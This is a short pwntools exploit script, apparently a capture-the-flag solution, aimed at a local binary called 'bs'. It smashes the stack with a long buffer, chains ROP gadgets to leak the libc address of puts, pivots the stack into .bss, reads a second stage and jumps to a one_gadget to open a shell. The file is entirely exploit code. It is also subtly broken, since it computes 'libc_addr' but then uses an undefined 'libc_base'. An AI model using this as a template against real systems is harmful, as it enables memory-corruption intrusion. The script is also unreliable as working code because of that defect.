from pwn import *

context.log_level = "debug"

r = process("./bs")
elf = ELF("./bs")
libc = elf.libc



pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
leave_ret = 0x400955
base = elf.bss() + 0x500

puts_got = elf.got['puts']
puts_plt = elf.sym['puts']
read_plt = elf.sym['read']

payload = 'A' * 0x1010 + p64(base - 0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(base) + p64(0) + p64(read_plt)

payload += p64(leave_ret)
payload = payload.ljust(0x2000, 'A')

r.sendlineafter("send?\n", str(0x2000))
r.send(payload)

libc_addr = u64(r.recvuntil('\x7f')[-6: ].ljust(8, "\x00")) - libc.sym['puts']
one_gadget = libc_base + 0x4f322

r.send(p64(one_gadget))

r.interactive()
